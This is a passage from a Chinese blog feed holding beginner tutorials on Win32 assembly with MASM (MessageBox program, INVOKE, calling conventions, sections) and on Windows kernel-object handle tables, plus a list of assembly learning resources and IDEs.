<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ExitProcess proto uExitCode：DWORD</div></pre></td></tr></table></figure>
<p>上面一行是函数原型。函数原型会告诉编译器和链接器该函数的属性，这样在编译和链接时，编译器和链接器就会作相关的类型检查。 函数的原型定义如下： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FunctionName PROTO [ParameterName]：DataType，[ParameterName]：DataType，...</div></pre></td></tr></table></figure>
<p>简言之，就是在函数名后加伪指令PROTO，再跟一串由逗号相隔的数据类型链表。在前面的 ExitProcess 定义中，该函数有一个 DWORD 类型的参数。当您使用高层调用语句 INVOKE 时，使用函数原型定义特别有用，您可以简单地认为 <strong>INVOKE 是一个有参数类型检查的调用语句</strong>。譬如，假设您这样写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">call ExitProcess</div></pre></td></tr></table></figure>
<p>若您事先没把一个DWORD类型参数压入堆栈，编译器和链接器都不会报错，但毫无疑问，在您的程序运行时将引起崩溃。但是，当您这样写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">invoke ExitProcess</div></pre></td></tr></table></figure>
<p>连接器将报错提醒您忘记压入一个 DWORD 类型参数。所以我<strong>建议您用 INVOKE 指令而不是CALL去调用一个函数</strong>。INVOKE 的语法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">INVOKE expression [，arguments]</div></pre></td></tr></table></figure>
<p>expression <strong>既可以是一个函数名也可以是一个函数指针</strong>。参数由逗号隔开。大多数API函数的原型放在头文件中。 如果您用的是 MASM32，这些头文件在文件夹MASM32/include 下， 这些头文件的扩展名为 INC，函数名和 DLL 中的函数名相同，譬如：KERNEL32.LIB 引出的函数 ExitProcess 的函数原形声明于kernel.inc中。您也可以自己声明函数原型。 </p>
<p>好，我们现在回到ExitProcess 函数，参数uExitCode 是您希望当您的应用程序结束时传递 Windows 的。 您可以这样写： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">invoke ExitProcess，0</div></pre></td></tr></table></figure>
<p>把这一行放到<code>start</code>标识符下，这个应用程序就会立即退出 Windows，当然毫无疑问个应用程序本身是一个完整的 Windows 程序。</p>
<p><strong>IDE为Visual MASM，masm32安装在c:\masm32</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">386</div><div class="line">.model flat， stdcall</div><div class="line">option casemap：none</div><div class="line"></div><div class="line">include c:\masm32\include\windows.inc</div><div class="line">include c:\masm32\include\kernel32.inc</div><div class="line">includelib c:\masm32\lib\kernel32.lib</div><div class="line"></div><div class="line">.data</div><div class="line">.code</div><div class="line">start:</div><div class="line">invoke ExitProcess，0</div><div class="line">end start</div></pre></td></tr></table></figure>
<p><code>option casemap：none</code> 一句的意思是告诉 MASM 要区分标号的大小写，譬如：start 和 START 是不同的。请注意新的伪指令 include，跟在其后的文件名所指定的文件在编译时将“插”在该处。在我们上面的程序段中，当MASM处理到语句 <code>include c:\masm\include\windows.inc</code> 时，它就会打开文件夹c:\masm32\include 中的文件windows.inc，这和您把整个文件都粘贴到您的源程序中的效果是一样的。 windows.inc 包含了 WIN32 编程所需要的常量和结构体的定义。 但是它不包含函数原型的定义。  </p>
<p>您的应用程序除了从 windows.inc 中得到相关变量结构体的定义外，还需要从其他的头文件中得到函数原型的声明，这些头文件都放在 c:\masm32\include 文件夹中。 在我们上面的例子中调用了 kernel.dll 中的函数，所以需要包含有这个函数原型声明的头文件 kernel.inc。如果用文本编辑器打开该文件您会发现里面全是从 kernel.dll中引出的函数的声明。如果您不包含kernel.inc，您仍然可以调用（call）ExitProcess，但不能够调用（invoke）ExitProcess（这会无法通过编译器和连接器的参数合法性检查）。所以若用 invoke 去调用一个函数，您就必须事先声明包含头文件，您完全可以在调用该函数前在源代码的适当位置进行声名。包含头文件主要是为了节省时间（当然还有正确性）  </p>
<p>接下来我们来看看 <code>includelib</code> 伪指令，和 <code>include</code> 不同，它仅仅是告诉编译器您的程序引用了哪个库。当编译器处理到该指令时会在生成的目标文件中插入链接命令告诉链接器链入什么库。当然您还可以通过在链接器的命令行指定引入库名称的方法来达到和用includelib指令相同的目的，但考虑到命令行仅能够传递128个字符而且要不厌其烦地在命令行敲字符，所以这种方法是非常不可取的。</p>
<h3 id="命令行编译"><a href="#命令行编译" class="headerlink" title="命令行编译"></a>命令行编译</h3><p>好了，现在保存例子，取名为msgbox.asm。把 ml.exe（C:\masm32\bin） 的路径放到 PATH 环境变量中，键入下面一行 进行编译：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ml /c /coff /Cp msgbox.asm</div></pre></td></tr></table></figure>
<ul>
<li><code>/c</code> 是告诉MASM只编译不链接。这主要是考虑到在链接前您可能还有其他工作要做。 </li>
<li><code>/coff</code> 告诉MASM产生的目标文件用 coff 格式。MASM 的 coff 格式是COFF（Common Object File Format：通用目标文件格式） 格式的一种变体。在 UNIX 下的 COFF 格式又有不同。 </li>
<li><code>/Cp</code> 告诉 MASM 不要更改用户定义的标识符的大小写。在.model 指令下加入 “option casemap：none” 语句，可达到同样的效果。<br>当您成功的编译了 msgbox.asm 后，编译器会产生 msgbox.obj 目标文件，目标文件和可执行文件只一步之遥，目标文件中包含了以二进制形式存在的指令和数据，比可执行文件相差的只是链接器加入的重定位信息。 </li>
</ul>
<p>好，我们来链接目标文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">link /SUBSYSTEM：WINDOWS /LIBPATH：c：\masm32\lib msgbox.obj</div></pre></td></tr></table></figure>
<ul>
<li><code>/SUBSYSTEM：WINDOWS</code> 告诉链接器可执行文件的运行平台 </li>
<li><code>/LIBPATH：〈path to import library〉</code> 告诉链接器引入库的路径。<br>链接器做的工作就是根据引入库往目标文件中加入重定位信息，最后产生可执行文件。 既然得到了可执行文件，我们来运行一下。好，一、二、三，GO！屏幕上什么都没有。哦，对了，我们除了调用了 ExitProcess 函数外，什么都还没做呢！但是别一点成就感都没有哦，因为我们用汇编所写的是一个真正 Windows 程序，不信的话，看看您磁盘上的 msgbox.exe文件。</li>
</ul>
<p>下面我们来做一点可以看的见摸的着的，我们在程序中加入一个对话框。该函数的原型如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">MessageBox PROTO hwnd：DWORD， lpText：DWORD， lpCaption：DWORD， uType：DWORD</div></pre></td></tr></table></figure>
<ul>
<li><code>hWnd</code> 是父窗口的句柄。句柄代表您引用的窗口的一个地址指针。它的值对您编 Windows 程序并不重要（译者注：如果您想成为高手则是必须的），您只要知道它代表一个窗口。当您要对窗口做任何操作时，必须要引用该窗口的指针。 </li>
<li><code>lpText</code> 是指向您要显示的文本的指针。指向文本串的指针事实上就是文本串的首地址。 </li>
<li><code>lpCaption</code> 是指向您要显示的对话框的标题文本串指针。 </li>
<li><code>uType</code> 是显示在对话框窗口上的小图标的类型。</li>
</ul>
<p>下面是源程序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">.386 </div><div class="line">.model flat,stdcall </div><div class="line">option casemap:none </div><div class="line">include \masm32\include\windows.inc </div><div class="line">include \masm32\include\kernel32.inc </div><div class="line">includelib \masm32\lib\kernel32.lib </div><div class="line">include \masm32\include\user32.inc </div><div class="line">includelib \masm32\lib\user32.lib </div><div class="line"></div><div class="line">.data </div><div class="line">MsgBoxCaption db &quot;可爱的标题&quot;，0</div><div class="line">MsgBoxText    db &quot;你好，我的第一个Win32汇编程序&quot;，0</div><div class="line"></div><div class="line">.code </div><div class="line">start: </div><div class="line">invoke MessageBox, NULL, addr MsgBoxText, addr MsgBoxCaption, MB_OK </div><div class="line">invoke ExitProcess, NULL </div><div class="line">end start</div></pre></td></tr></table></figure>
<p>编译、链接上面的程序段，得到可执行文件。运行，哈哈，窗口上弹出了一个对话框，上面有一行字：“你好，我的第一个Win32汇编程序”。</p>
<p>好，我们回过头来看看上面的源代码。我们在.DATA“分段”定义了两个NULL结尾的字符串。我们用了两个常量：<code>NULL</code> 和 <code>MB_OK</code>。这些常量在windows.inc 文件中有定义，使用常量使得您的程序有较好的可读性。 <code>addr</code> 操作符用来把标号的地址传递给被调用的函数，它只能用在 <code>invoke</code> 语句中，譬如您不能用它来把标号的地址赋给寄存器或变量，如果想这样做则要用 <code>offset</code> 操作符。在 <code>offset</code> 和 <code>addr</code> 之间有如下区别：</p>
<p><code>addr</code>不可以处理向前引用，<code>offset</code>则能。所谓向前引用是指：标号的定义是在<code>invoke</code> 语句之后，譬如在如下的例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">invoke MessageBox，NULL， addr MsgBoxText，addr MsgBoxCaption，MB_OK</div><div class="line"></div><div class="line">...... </div><div class="line"></div><div class="line">MsgBoxCaption db &quot;可爱的标题&quot;，0</div><div class="line">MsgBoxText db &quot;你好，我的第一个Win32汇编程序&quot;，0</div></pre></td></tr></table></figure>
<p>如果您是用 <code>addr</code> 而不是 <code>offset</code> 的话，那 MASM 就会报错。</p>
<p><code>addr</code>可以处理局部变量而 <code>offset</code> 则不能。局部变量只是在运行时在堆栈中分配内存空间。而 <code>offset</code> 则是在编译时由编译器解释，这显然不能用 <code>offset</code> 在运行时来分配内存空间。编译器对 <code>addr</code> 的处理是先检查处理的是全局还是局部变量，若是全局变量则把其地址放到目标文件中，这一点和 <code>offset</code> 相同，若是局部变量，就在执行 <code>invoke</code> 语句前产生如下指令序列： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">lea eax， LocalVar</div><div class="line">push eax</div></pre></td></tr></table></figure>
<p>因为<code>lea</code>指令能够在运行时决定标号的有效地址，所以有了上述指令序列，就可以保证 <code>invoke</code> 的正确执行了。 </p>
<h3 id="更方便的编译选择：Visual-MASM"><a href="#更方便的编译选择：Visual-MASM" class="headerlink" title="更方便的编译选择：Visual MASM"></a>更方便的编译选择：Visual MASM</h3><p>新建一个asm后缀文件，用Visual MASM打开，把上面的代码复制进去，点击左上角的Run即可，如图所示。<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fo72650fqnj20ux0ian06.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这一次，我们将用汇编语言写一个 Windows 程序，程序运行时将弹出一个消息框并显示”你好，我的第一个Win32汇编程序”。&lt;/p&gt;
    
    </summary>
    
      <category term="汇编(ASM)" scheme="http://hacktech.cn/categories/%E6%B1%87%E7%BC%96-ASM/"/>
    
    
      <category term="ASM" scheme="http://hacktech.cn/tags/ASM/"/>
    
      <category term="读书笔记" scheme="http://hacktech.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Win32汇编学习(1)：基本概念</title>
    <link href="http://hacktech.cn/2018/02/05/Win32%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-1-%EF%BC%9A%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html"/>
    <id>http://hacktech.cn/2018/02/05/Win32汇编学习-1-：基本概念.html</id>
    <published>2018-02-05T05:45:40.000Z</published>
    <updated>2018-04-10T13:20:36.040Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>Windows 把每一个 Win32 应用程序放到分开的虚拟地址空间中去运行，也就是说每一个应用程序都拥有其相互独立的 4GB 地址空间，当然这倒不是说它们都拥有 4GB 的物理地址空间，而只是说能够在 4GB 的范围内寻址。操作系统将会在应用程序运行时完成 4GB 的虚拟地址和物理内存地址间的转换。这就要求编写应用程序时必须格守 Windows 的规范，否则极易引起内存的保护模式错误。而过去的 Win16 内存模式下，所有的应用程序都运行于同一个 4GB 地址空间，它们可以彼此”看”到别的程序的内容，这极易导致一个应用程序破坏另一个应用程序甚至是操作系统的数据或代码。  </p>
<a id="more"></a>
<p>和 16 位 Windows 下的把代码分成 DATA，CODE 等段的内存模式不同，WIN32 只有一种内存模式，即 FLAT 模式，意思是”平坦”的内存模式，再没有 64K 的段大小限制，所有的 WIN32 的应用程序运行在一个连续、平坦、巨大的 4GB 的空间中。这同时也意味着您无须和段寄存器打交道，您可以用任意的段寄存器寻址任意的地址空间，这对于程序员来说是非常方便的，这也使得用32位汇编语言和用C语言一样方便。 在Win32下编程，有许多重要的规则需要遵守。有一条很重要的是：Windows 在内部频繁使用 ESI，EDI，EBP，EBX 寄存器，而且并不去检测这些寄存器的值是否被更改，这样当您要使用这些寄存器时必须先保存它们的值，待用完后再恢复它们，一个最显著的应用例子就是 Windows 的 CallBack 函数中。   </p>
<h2 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h2><p>一般的Win32汇编都有下面的程序段，这是一个Win32汇编编程的基础框架，若您现在还不知道这些指令的确切意义的话，没关系， 随后我就会给大家详细解释。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">.386 </div><div class="line">.MODEL Flat, STDCALL </div><div class="line">.DATA </div><div class="line">    &lt;Your initialized data&gt; </div><div class="line">    ...... </div><div class="line">.DATA? </div><div class="line">   &lt;Your uninitialized data&gt; </div><div class="line">   ...... </div><div class="line">.CONST </div><div class="line">   &lt;Your constants&gt; </div><div class="line">   ...... </div><div class="line">.CODE </div><div class="line">   &lt;label&gt; </div><div class="line">    &lt;Your code&gt; </div><div class="line">   ..... </div><div class="line">    end &lt;label&gt;</div></pre></td></tr></table></figure></p>
<p>这就是一般Win32汇编编程的基础框架，其中各个关键词的解释说明如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.386</div></pre></td></tr></table></figure>
<p>这是一个汇编语言伪指令，他告诉编译器我们的程序是使用80386指令集编写的。您还可以使用 .486、.586， 但最安全的还是使用.386。对于每一种CPU有两套几乎功能相同伪指令： .386/.386P、 486/.486P、 586/.586P。 带P的指令标明您的程序中可以用特权级指令。特权级指令是保留给操作系统的，如虚拟设备驱动程序。在大多数时间，您的程序都无须运行在RING0层，故用不带后缀P的伪指令已足够了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.MODEL FLAT，STDCALL</div></pre></td></tr></table></figure>
<p><code>.MODEL</code> 是用来指定内存模式的伪指令，在Win32下，只有一种内存模型，那就是FLAT。 <code>STDCALL</code> 告诉编译器参数的传递约定。参数的传递约定是指参数传达时的顺序(从左到右或从右到左)和由谁恢复堆栈指针(调用者或被调用者)。在Win16下有两种约定：<code>C</code> 和 <code>PASCAL</code>。C 约定规定参数传递顺序是从右到左，即最右边的参数最先压栈，由调用者恢复堆栈指针。</p>
<p>例如：为调用函数 <code>foo ( int first_param， int second_param， int third_param )</code>； 按C约定的汇编代码应该是这样的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">push [third_param]</div><div class="line">push [second_param]</div><div class="line">push [first_param]</div><div class="line">call foo</div><div class="line">add esp， 3 * 4 ;调用者自己恢复堆栈指针</div></pre></td></tr></table></figure>
<p><code>PASCAL</code>约定和<code>C</code>约定正好相反，它规定参数是从左向右传递，由被调用者恢复堆栈。Win16采用了<code>PASCAL</code>约定， 因为<code>PASCAL</code>约定产生的代码量要小。当不知道参数的个数时，<code>C</code>约定特别有用。如在函数<code>wsprintf ()</code> 中， <code>wsprintf</code>预先并不知道要传递几个参数，所以它不知道如何恢复堆栈。<code>STDCALL</code>是<code>C</code>约定和<code>PASCAL</code>约定的混合体，它规定参数的传递是从右到左，恢复堆栈的工作交由被调用者。Win32只用<code>STDCALL</code>约定，但除了一个特例，即：<code>wsprintf</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">.DATA </div><div class="line">.DATA? </div><div class="line">.CONST </div><div class="line">.CODE</div></pre></td></tr></table></figure>
<p>上面的四个伪指令是”分段”(SECTION)伪指令。我们上面刚讲过Win32下没有”段”(SEGMENT)的概念，但是您可以把您的程序分成不同的”分段”， 一个”分段”的开始即是上一个”分段”的结束。WIN32中只有两种性质的”分段”：<code>DATA</code>和<code>CODE</code>。</p>
<p>其中DATA”分段”又分为三种：</p>
<ul>
<li><code>.DATA</code> 其中包括已初始化的数据。</li>
<li><code>.DATA?</code> 其中包括未初始化的数据。比如有时您仅想预先分配一些内存但并不想指定初始值。使用未初始化的数据的优点是它不占据可执行文件的大小，如：若您要在 <code>.DATA?</code> 段中分配10,000字节的空间，您的可执行文件的大小无须增加10,000字节，而仅仅是要告诉编译器在装载可执行文件时分配所需字节。</li>
<li><code>.CONST</code> 其中包括常量定义。这些常量在程序运行过程中是不能更改的。 应用程序并不需要以上所有的三个”分段”， 可以根据需要进行定义。 </li>
<li><code>.CODE</code> 这是代码”分段”。 <blockquote>
<p>实际上，分段并不是象在 Dos 下一样，为不同的段分别指出不同的段寄存器，因为 Windows 下只有一个 4GB 的段，Windows 程序中的分段表现在当程序装载时，赋予不同的分段不同的属性，比如说当你的程序加载时，对于 Ring3 程序来说，.code 段是不可写的，而 .data 段是可写的，如果你尝试象在 Dos 下一样写自己的代码部分，你会得到一个蓝屏错误</p>
</blockquote>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;label&gt; </div><div class="line">end &lt;label&gt;</div></pre></td></tr></table></figure>
<p>是用来唯一标识您的代码范围的标签， 两个标签必须相同，应用程序的所有可执行代码必须在两个标签之间。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;背景知识&quot;&gt;&lt;a href=&quot;#背景知识&quot; class=&quot;headerlink&quot; title=&quot;背景知识&quot;&gt;&lt;/a&gt;背景知识&lt;/h2&gt;&lt;p&gt;Windows 把每一个 Win32 应用程序放到分开的虚拟地址空间中去运行，也就是说每一个应用程序都拥有其相互独立的 4GB 地址空间，当然这倒不是说它们都拥有 4GB 的物理地址空间，而只是说能够在 4GB 的范围内寻址。操作系统将会在应用程序运行时完成 4GB 的虚拟地址和物理内存地址间的转换。这就要求编写应用程序时必须格守 Windows 的规范，否则极易引起内存的保护模式错误。而过去的 Win16 内存模式下，所有的应用程序都运行于同一个 4GB 地址空间，它们可以彼此”看”到别的程序的内容，这极易导致一个应用程序破坏另一个应用程序甚至是操作系统的数据或代码。  &lt;/p&gt;
    
    </summary>
    
      <category term="汇编(ASM)" scheme="http://hacktech.cn/categories/%E6%B1%87%E7%BC%96-ASM/"/>
    
    
      <category term="ASM" scheme="http://hacktech.cn/tags/ASM/"/>
    
      <category term="读书笔记" scheme="http://hacktech.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>win32汇编(ASM)学习资源</title>
    <link href="http://hacktech.cn/2018/02/04/win32%E6%B1%87%E7%BC%96-ASM-%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90.html"/>
    <id>http://hacktech.cn/2018/02/04/win32汇编-ASM-学习资源.html</id>
    <published>2018-02-04T14:44:06.000Z</published>
    <updated>2018-04-10T05:28:20.062Z</updated>
    
    <content type="html"><![CDATA[<p>一些win32汇编下学习资源与工具收集</p>
<a id="more"></a>
<h2 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h2><ul>
<li><a href="http://www.aogosoft.com/" target="_blank" rel="external">AoGo汇编小站(MASMPlus作者)</a></li>
<li><a href="http://icodeguru.com/Embedded/winasm/index.html" target="_blank" rel="external">Win32Asm教程在线版</a></li>
<li><p><a href="https://files.cnblogs.com/files/Akkuman/winasm.chm.7z" target="_blank" rel="external">Win32Asm教程博客园文件备份版</a><br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fo72731wbtj20kp0h247i.jpg" alt=""></p>
</li>
<li><p><a href="https://files.cnblogs.com/files/Akkuman/Masm32%E8%A1%A5%E5%85%85%E6%95%99%E7%A8%8B%E7%B3%BB%E5%88%97.chm.7z" target="_blank" rel="external">Masm32补充教程系列</a><br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fo727e56z1j20hs0dcq67.jpg" alt=""></p>
</li>
<li><p><a href="https://files.cnblogs.com/files/Akkuman/Win32ASMTRK.chm.7z" target="_blank" rel="external">Win32 ASM Tutorial Resource Kit</a>：dREAMtHEATER收集的WIN32ASM教程，内容很全，包括32位汇编的基础知识，Iczelion的经典教程中英文版，罗云彬的32位汇编教程，还有PE格式和VxD的一些内容。<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fo727jul82j20ln0ettaz.jpg" alt=""></p>
</li>
</ul>
<h2 id="IDE"><a href="#IDE" class="headerlink" title="IDE"></a>IDE</h2><ul>
<li><a href="http://www.aogosoft.com/masmplus/" target="_blank" rel="external">MASMPlus</a></li>
<li><a href="http://www.visualmasm.com/" target="_blank" rel="external">Visual MASM(推荐)</a></li>
<li><a href="https://github.com/mrfearless/RadASM2" target="_blank" rel="external">RadASM2_fork</a></li>
<li><a href="https://bbs.pediy.com/thread-210513.htm" target="_blank" rel="external">RadAsm 3.x支持中文注释</a></li>
<li><a href="https://dman95.github.io/SASM/english.html" target="_blank" rel="external">SASM</a></li>
<li><a href="http://easycode.cat/English/" target="_blank" rel="external">Easy Code</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一些win32汇编下学习资源与工具收集&lt;/p&gt;
    
    </summary>
    
      <category term="汇编(ASM)" scheme="http://hacktech.cn/categories/%E6%B1%87%E7%BC%96-ASM/"/>
    
    
      <category term="ASM" scheme="http://hacktech.cn/tags/ASM/"/>
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Windows进程的内核对象句柄表</title>
    <link href="http://hacktech.cn/2018/02/04/Windows%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%86%85%E6%A0%B8%E5%AF%B9%E8%B1%A1%E5%8F%A5%E6%9F%84%E8%A1%A8.html"/>
    <id>http://hacktech.cn/2018/02/04/Windows进程的内核对象句柄表.html</id>
    <published>2018-02-04T09:22:00.000Z</published>
    <updated>2018-04-10T05:28:02.184Z</updated>
    
    <content type="html"><![CDATA[<p>当一个进程被初始化时,系统要为它分配一个句柄表。该句柄表只用于内核对象 ,不用于用户对象或GDI对象。  </p>
<p><img src="http://ww1.sinaimg.cn/large/c0264382gy1foaobsqowpj20nz05c0t3.jpg" alt=""></p>
<a id="more"></a>
<h2 id="创建内核对象"><a href="#创建内核对象" class="headerlink" title="创建内核对象"></a>创建内核对象</h2><p>当进程初次被初始化时，它的句柄表是空的。然后，当进程中的线程调用创建内核对象的函数时，比如CreateFileMapping，内核就为该对象分配一个内存块，并对它初始化。这时，内核对进程的句柄表进行扫描，找出一个空项。由于表 3 - 1中的句柄表是空的，内核便找到索引1位置上的结构并对它进行初始化。该指针成员将被设置为内核对象的数据结构的内存地址，访问屏蔽设置为全部访问权，同时，各个标志也作了设置。  </p>
<p>下面列出了用于创建内核对象的一些函数（不是个完整的列表）：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="function">HANDLE <span class="title">CreateThread</span><span class="params">(</span></span></div><div class="line">    PSECURITY_ATTRIBUTE psa,</div><div class="line">    DWORD dwStackSize,</div><div class="line">    LPTHREAD_START_ROUTINE pfnStartAddr,</div><div class="line">    PVOID pvParam,</div><div class="line">    DWORD dwCreationFlags,</div><div class="line">    PDWORD pdwThreadId);</div><div class="line"></div><div class="line"><span class="function">HANDLE <span class="title">CreateFile</span><span class="params">(</span></span></div><div class="line">    PCTSTR pszFileNAme,</div><div class="line">    DWORD dwDesiredAccess,</div><div class="line">    DWORD dwShareMode,</div><div class="line">    PSECURITY_ATTRIBUTES psa,</div><div class="line">    DWORD dwCreationDistribution,</div><div class="line">    DWORD dwFlagsAndAttributes,</div><div class="line">    HANDLE hTemplateFile);</div><div class="line"></div><div class="line"><span class="function">HANDLE <span class="title">CreateFileMapping</span><span class="params">(</span></span></div><div class="line">    HANDLE hFile,</div><div class="line">    PSECURITY_ATTRIBUTES psa,</div><div class="line">    DWORD flPRotect,</div><div class="line">    DWORD dwMaximumSizeHigh,</div><div class="line">    DWORD dwMaximumSizeLow,</div><div class="line">    PCTSTR pszName);</div><div class="line"></div><div class="line"><span class="function">HANDLE <span class="title">CreateSemaphore</span><span class="params">(</span></span></div><div class="line">    PSECURITY_ATTRIBUTES psa,</div><div class="line">    LONG lInitialCount,</div><div class="line">    LONG lMaximumCount,</div><div class="line">    PCTSTR pszName);</div></pre></td></tr></table></figure>
<p>用于创建内核对象的所有函数均返回与进程相关的句柄，这些句柄可以被在相同进程中运行的任何或所有线程成功地加以使用。该句柄值实际上是放入进程的句柄表中的索引，它用于标识内核对象的信息存放的位置。 因此当调试一个应用程序且观察内核对象句柄的实际值时，会看到一些较小的值，如1，2等。  </p>
<p>每当调用一个将内核对象句柄接受为参数的函数时，就要传递由一个 Create*&amp;函数返回的值。从内部来说，该函数要查看进程的句柄表，以获取要生成的内核对象的地址，然后按定义得很好的方式来生成该对象的数据结构。  </p>
<p>如果传递了一个无效索引（句柄），该函数便返回失败，而GetLastError则返回 6（ERROR_INVALID_HANDLE）。由于句柄值实际上是放入进程句柄表的索引，因此这些句柄是与进程相关的，并且不能由其他进程成功地使用。  </p>
<p>如果调用一个函数以便创建内核对象，但是调用失败了，那么返回的句柄值通常是0（NULL）。发生这种情况是因为系统的内存非常短缺，或者遇到了安全方面的问题。不过有少数函数在运行失败时返回的句柄值是-1（INVALID_HANDLE_VALUE）。例如，如果CreateFile未能打开指定的文件，那么它将返回INVALID_HANDLE_VALUE，而不是返回NULL。当查看创建内核对象的函数返回值时，必须格外小心。特别要注意的是，只有当调用CreateFile函数时，才能将该值与INVALID_HANDLE_VALUE进行比较。下面的代码是不正确的：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">HANDLE hMutex = CreateMutex(...);</div><div class="line"><span class="keyword">if</span> (hMutex == INVALID_HANDLE_VALUE) &#123;</div><div class="line">    <span class="comment">//这段代码不会执行，因为CreateMutex调用失败的时候返回的是NULL</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>同样的，下面的代码也不正确：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">HANDLE hFile = CreateFile(...);</div><div class="line"><span class="keyword">if</span> (hFIle == <span class="literal">NULL</span>) &#123;</div><div class="line">    <span class="comment">//这段代码不会执行，因为CreateFile调用失败的时候返回的是INVALID_HANDLE_VALUE(-1)</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="关闭内核对象"><a href="#关闭内核对象" class="headerlink" title="关闭内核对象"></a>关闭内核对象</h2><p>无论怎样创建内核对象，都要向系统指明将通过调用C l o s e H a n d l e来结束对该对象的操作：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">CloseHandle</span><span class="params">(HANDLE hobj)</span></span>;</div></pre></td></tr></table></figure>
